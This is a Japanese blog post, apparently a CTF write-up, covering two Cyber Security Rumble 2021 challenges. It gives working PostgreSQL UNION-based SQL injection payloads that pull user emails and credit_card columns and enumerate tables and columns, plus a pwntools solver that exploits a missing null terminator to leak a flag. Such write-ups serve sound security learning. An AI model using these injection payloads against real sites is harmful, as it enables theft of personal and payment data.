{"componentChunkName":"component---src-templates-post-template-js","path":"/ctf-rumblectf-2021","result":{"data":{"markdownRemark":{"id":"14e48781-5c8a-548c-b15d-3ed5f56f5c80","html":"<p>2021/11/26から開催されていたCyber Security  Rumble 2021 CTFに参加してきました。</p>\n<p>いくつかWriteUpを書いていきます。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li>\n<p><a href=\"#stonks-street-journalweb\">Stonks Street Journal(Web)</a></p>\n<ul>\n<li><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E4%BB%96%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B\">SQLインジェクションで他のユーザの情報を取得する</a></li>\n<li><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E4%BB%96%E3%81%AE%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%82%92%E6%8E%A2%E7%B4%A2%E3%81%99%E3%82%8B\">SQLインジェクションで他のテーブルを探索する</a></li>\n<li><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E3%82%AB%E3%83%A9%E3%83%A0%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E6%8E%A2%E7%B4%A2%E3%81%99%E3%82%8B\">SQLインジェクションでカラムの情報を探索する</a></li>\n</ul>\n</li>\n<li><a href=\"#flag-checker-babypwn\">Flag Checker, Baby(Pwn)</a></li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n</ul>\n<h2 id=\"stonks-street-journalweb\" style=\"position:relative;\"><a href=\"#stonks-street-journalweb\" aria-label=\"stonks street journalweb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stonks Street Journal(Web)</h2>\n<p>Webサイトにアクセスすると、会員制のニュースニュースサイトにアクセスできます。</p>\n<p>会員登録を行うと、ユーザ登録は完了しないものの、登録情報が確認できるInvoiceページにリダイレクトされます。</p>\n<p>このページは、以下のようなURLでアクセスされるページであり、<code class=\"language-text\">username-2021-11-27</code>のような登録ユーザと日付をBase64エンコーディングしたパスで管理されています。</p>\n<p><code class=\"language-text\">http://ssj.rumble.host/legacy_invoice_system/dGVzdHVzZXItMjAyMS0xMS0yNw==</code></p>\n<p>ここで、usernameの部分か日付の部分をフォーマットに合わない適当な文字列に変更してみたところ、SQL文のエラーが発生したため、SQLインジェクションの脆弱性が存在することがわかりました。</p>\n<h3 id=\"sqlインジェクションで他のユーザの情報を取得する\" style=\"position:relative;\"><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E4%BB%96%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B\" aria-label=\"sqlインジェクションで他のユーザの情報を取得する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLインジェクションで他のユーザの情報を取得する</h3>\n<p>まずはテーブル内の他のユーザの情報を探索するところから始めました。</p>\n<p>探索にはUNIONインジェクションが使えそうでした。</p>\n<p>ユーザを管理しているテーブル名についてはWHEREやHAVINGなどのコマンドを使ってエラーメッセージを出力させることで、<code class=\"language-text\">news_subscriber</code>であるということが特定できました。</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">Rakete<span class=\"token operator\">-</span><span class=\"token number\">2021</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">-</span><span class=\"token number\">26</span>' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>pensi<span class=\"token punctuation\">,</span>email<span class=\"token punctuation\">,</span>credit_card<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> news_subscriber <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token comment\">--</span></code></pre></div>\n<p>そのため、上記のようなコマンドでIDやUsernameを指定してユーザページを一つずつ確認することができます。</p>\n<p>しかし、残念ながら<code class=\"language-text\">news_subscriber</code>のテーブルをすべて探索しても、Flagにつながりそうなユーザは存在しませんでした。</p>\n<h3 id=\"sqlインジェクションで他のテーブルを探索する\" style=\"position:relative;\"><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E4%BB%96%E3%81%AE%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%82%92%E6%8E%A2%E7%B4%A2%E3%81%99%E3%82%8B\" aria-label=\"sqlインジェクションで他のテーブルを探索する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLインジェクションで他のテーブルを探索する</h3>\n<p>次に、<code class=\"language-text\">news_subscriber</code>以外のテーブルを見つけるべく、探索を行うことにしました。</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">Rakete<span class=\"token operator\">-</span><span class=\"token number\">2021</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">-</span><span class=\"token number\">26</span>' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> id<span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> news_subscriber</code></pre></div>\n<p>データベースの種類については、上記のように<code class=\"language-text\">version()</code>コマンドを利用することで、Postgresであることが特定できました。</p>\n<p>データベースがPostgresであるので、テーブル情報については<code class=\"language-text\">pg_tables</code>の<code class=\"language-text\">tablename</code>から参照することができます。</p>\n<p>取得方法はいくつかありますが、先頭から順に網羅するなら<code class=\"language-text\">LIMIT 1 OFFSET n</code>の構文が便利です。</p>\n<p>また、特定の文字列を含むテーブルを探索したい場合には<code class=\"language-text\">LIKE</code>も有効です。</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token comment\"># 6番目のテーブルをSQLインジェクションで取得</span>\nRakete<span class=\"token operator\">-</span><span class=\"token number\">2021</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">-</span><span class=\"token number\">26</span><span class=\"token string\">';SELECT null,tablename,null,null,null,null,null FROM pg_tables LIMIT 1 OFFSET 6;--\n\n# テーブル名にnameが含まれるテーブルをSQLインジェクションで取得\nRakete-2021-11-26'</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>tablename<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> pg_tables <span class=\"token keyword\">WHERE</span> tablename <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%name%'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></code></pre></div>\n<p>上記の方法でテーブルを探索した結果、<code class=\"language-text\">news_article</code>というテーブルが見つかりました。</p>\n<h3 id=\"sqlインジェクションでカラムの情報を探索する\" style=\"position:relative;\"><a href=\"#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E3%82%AB%E3%83%A9%E3%83%A0%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E6%8E%A2%E7%B4%A2%E3%81%99%E3%82%8B\" aria-label=\"sqlインジェクションでカラムの情報を探索する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLインジェクションでカラムの情報を探索する</h3>\n<p>Flagはどうやら<code class=\"language-text\">news_article</code>テーブルに存在していそうだということがわかりました。</p>\n<p>そのため、<code class=\"language-text\">news_article</code>テーブルのカラムについて探索していきます。</p>\n<p>Postgresの場合、特定のテーブルのカラムの情報は<code class=\"language-text\">information_schema.columns WHERE table_name='news_article'</code>の形式で絞りこむことができます。</p>\n<p>あとは先ほどテーブル情報を取得したときと同じく、LIMITやLIKEを使ってカラムの情報を洗い出した後、UNIONインジェクションを用いてカラムの情報を取得することで、Flagを取得できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">Rakete<span class=\"token operator\">-</span><span class=\"token number\">2021</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">-</span><span class=\"token number\">26</span><span class=\"token string\">';SELECT null,column_name,null,null,null,null,null FROM information_schema.columns WHERE table_name='</span>news_article<span class=\"token string\">' AND column_name LIMIT 1 OFFSET 3;--\n\nRakete-2021-11-26'</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>column_name<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'news_article'</span> <span class=\"token operator\">AND</span> column_name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%te%'</span><span class=\"token comment\">--</span></code></pre></div>\n<p>この方法を用いることで、以下のようにInvoiceページのタイトルからFlagの情報を取得することができました。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/2c0394ba764763e3944aee1550b2d2b5/0b533/image-14.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAARlAAAEZQAGA43XUAAABK0lEQVQoz52RSW6DQBBF+/6X4gIYYhBkjcBgGWxmjIFAHl1yK86wyV+UflfXr1HVdW3btuM4h8PB933Xdd+ewPmuYVkWfsKOx2MQBETyNY6j2r5gfQLO3+12I/U0TR8a+LHzPAsHqmmaPM+LosAOwyApsGgGjWVZxAkhozyxpFBZltEYljgE22+QOijDMKQMHizxe2UYH/Tz0Ljf7zyFmLLUgUdRdL1e4Wma8qtOp1OSJOfzGQunBSLEE8dx13VGDKFa27bwsixpU1VVRY7tX1CSDCYrXV4hHnbOFFK/73vZ/77ty+XieR5XYU5zFQMikDGhiAGR6GX5itm4e64h215fIfXNCemU1cpTkZKt4JLJ1x8wXZAFGWGTxn7nb8f8686EMhfnkG1zMPSfAOyx+PIMzWgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2c0394ba764763e3944aee1550b2d2b5/8ac56/image-14.webp 240w,\n/static/2c0394ba764763e3944aee1550b2d2b5/d3be9/image-14.webp 480w,\n/static/2c0394ba764763e3944aee1550b2d2b5/b0a15/image-14.webp 500w\"\n              sizes=\"(max-width: 500px) 100vw, 500px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2c0394ba764763e3944aee1550b2d2b5/8ff5a/image-14.png 240w,\n/static/2c0394ba764763e3944aee1550b2d2b5/e85cb/image-14.png 480w,\n/static/2c0394ba764763e3944aee1550b2d2b5/0b533/image-14.png 500w\"\n            sizes=\"(max-width: 500px) 100vw, 500px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2c0394ba764763e3944aee1550b2d2b5/0b533/image-14.png\"\n            alt=\"image-14.png\"\n            title=\"image-14.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>参考：<a href=\"https://ctf.zeyu2001.com/2021/cybersecurityrumble-ctf/stonks-street-journal\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Stonks Street Journal - CTFs</a></p>\n<h2 id=\"flag-checker-babypwn\" style=\"position:relative;\"><a href=\"#flag-checker-babypwn\" aria-label=\"flag checker babypwn permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flag Checker, Baby(Pwn)</h2>\n<p>バイナリとソースコードが与えられます。</p>\n<p>ソースコードを読むと、以下の挙動になることがわかります。</p>\n<ol>\n<li>入力された文字列とFLAGをcheck関数に渡す</li>\n<li>入力された文字列が32バイト(guessのサイズ)より大きい場合は、関数は呼び出されない</li>\n<li>変数guessには、入力した文字列が格納される</li>\n<li>変数flagには、FLAGが格納される</li>\n<li>変数flagと変数guessはstrcmpで比較され、一致した場合はフラグが表示され、不一致の場合はguessの値が表示される</li>\n<li>ローカル変数のメモリアドレスを考えると、変数flagは変数guessの後に連結して配置されている</li>\n<li>guess変数は32バイトまでしか受け取れないので、32バイト分のヌル文字を含まない値を入力することで、<code class=\"language-text\">printf(\"Wrong flag: %s\\n\", guess);</code>の行に連結された変数guessと変数flagの値が出力される。</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>secret_flag<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\t\n\t<span class=\"token keyword\">char</span> guess<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HACKER!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> secret_flag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Well done! You got it: %s\\n\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrong flag: %s\\n\"</span><span class=\"token punctuation\">,</span> guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> _IONBF<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> _IONBF<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>secret_flag <span class=\"token operator\">=</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>secret_flag<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Flag not found, contact challenge authors.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">char</span> input<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter the flag: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">check</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> secret_flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>このSolverでFLAGを取得できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> time\n\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./chall\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\x41\"</span><span class=\"token operator\">*</span><span class=\"token number\">31</span>\n\n<span class=\"token comment\"># Local</span>\np <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./chall\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p = remote(\"challs.rumble.host\", 53921)</span>\n\nr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>参考：<a href=\"https://github.com/aly-ab/CTF-writeups/blob/main/notes/cybersecurityrumble/Pwn%20-%20Flag%20Checker%2C%20Baby.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CTF-writeups/Pwn - Flag Checker, Baby.md at main · aly-ab/CTF-writeups</a></p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>Revの問題にLinuxのGame問題があったので何とか解きたかったのですが、結局解くことができませんでした。</p>\n<p>WriteUpが見当たらないのでいまだに謎のままですが、もしWriteUpが見つかればこの記事も更新しようと思います。</p>","fields":{"slug":"/ctf-rumblectf-2021","tagSlugs":["/tag/ctf/","/tag/web/","/tag/pwn/"]},"frontmatter":{"date":"2021-11-30","description":"2021/11/26から開催されていたCyber Security  Rumble 2021 CTFに参加してきました。","tags":["CTF","Web","Pwn"],"title":"Cyber Security Rumble CTF 2021 Writeup","socialImage":{"publicURL":"/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"}}}},"pageContext":{"slug":"/ctf-rumblectf-2021"}},"staticQueryHashes":["251939775","401334301","825871152"]}